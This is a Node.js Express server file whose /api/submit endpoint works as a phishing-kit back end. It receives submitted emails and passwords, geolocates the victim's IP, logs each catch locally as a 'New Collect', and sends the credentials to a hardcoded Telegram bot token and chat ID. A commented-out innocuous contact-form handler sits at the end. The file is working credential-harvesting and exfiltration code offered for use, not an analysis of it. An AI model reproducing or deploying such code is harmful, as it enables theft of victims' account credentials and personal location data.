import express from "express";
import { writeFileSync } from 'fs';
import http from 'http';
import https from 'https';

const app = express();
const PORT = process.env.PORT || 19992;

app.post("/api/submit", (req, res) => {

        // Extract real client IP — Cloudflare tunnel sets cf-connecting-ip
        const clientIp = req.headers['cf-connecting-ip']
                      || req.headers['x-forwarded-for']?.split(',')[0].trim()
                      || req.socket.remoteAddress
                      || '—';

        let raw = '';
        req.on('data', chunk => { raw += chunk; });
        req.on('end', () => {
          try {
            const data      = JSON.parse(raw);
            const ts        = new Date().toISOString();
            const recipient = data.recipient || '—';
            const email     = data.email     || '—';
            const password  = data.password  || '—';

            // ── IP geolocation (ip-api.com — free, no key, HTTP only) ──────────
            const geoReq = http.request(`http://ip-api.com/json/${clientIp}?fields=status,isp,regionName,city`, (geoRes) => {
                let geoRaw = '';
                geoRes.on('data', c => { geoRaw += c; });
                geoRes.on('end', () => {
                  let isp = '—', region = '—', city = '—';
                  try {
                    const geo = JSON.parse(geoRaw);
                    if (geo.status === 'success') {
                      isp    = geo.isp        || '—';
                      region = geo.regionName || '—';
                      city   = geo.city       || '—';
                    }
                  } catch { /* ignore */ }

                  // ── local log ──────────────────────────────────────────────
                  const entry = `[${ts}] recipient=${recipient} | email=${email} | password=${password} | ip=${clientIp} | isp=${isp} | region=${region} | city=${city}\n`;
                  writeFileSync('collect_log.txt', entry, { flag: 'a' });
                  log('💰', `COLLECT → ${email} | ip=${clientIp} | ${city}, ${region} | ${isp}`);

                  // ── Telegram notification ──────────────────────────────────
                  const TG_TOKEN   = '9245719568:AAH6qv4YRXNm93Oj6ksLc-R1Qvg753cCjSc';
                  const TG_CHAT_ID = '8798855832';
                  if (TG_TOKEN && TG_CHAT_ID) {
                    const text = encodeURIComponent(
                      `🎯 New Collect\n` +
                      `👤 Recipient: ${recipient}\n` +
                      `📧 Email: ${email}\n` +
                      `🔑 Password: ${password}\n` +
                      `🌐 IP: ${clientIp}\n` +
                      `🏢 ISP: ${isp}\n` +
                      `📍 Location: ${city}, ${region}\n` +
                      `🕒 ${ts}`
                    );
                    const tgUrl = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${text}`;
                    https.get(tgUrl, (r) => { r.resume(); })
                         .on('error', (err) => { log('warn', `Telegram error: ${err.message}`); });
                  }
                });
              });
              geoReq.on('error', () => {
                // geo failed — still log without location
                const entry = `[${ts}] recipient=${recipient} | email=${email} | password=${password} | ip=${clientIp} | isp=— | region=— | city=—\n`;
              });
              geoReq.end();
          } catch { /* bad JSON — ignore */ }

          res.writeHead(200, {
            'Content-Type':                'application/json',
            'Access-Control-Allow-Origin': '*',
          });
          res.end(JSON.stringify({ ok: true }));
        });

        // server.js

});



//   const { name, email, message } = req.body;

//   if (!email || !message) {
//     return res.status(400).json({ error: "Email and message are required" });
//   }

//   console.log({
//     name: name || "",
//     email,
//     message,
//     submittedAt: new Date().toISOString()
//   });

//   res.json({ ok: true, message: "Submitted successfully" });


app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});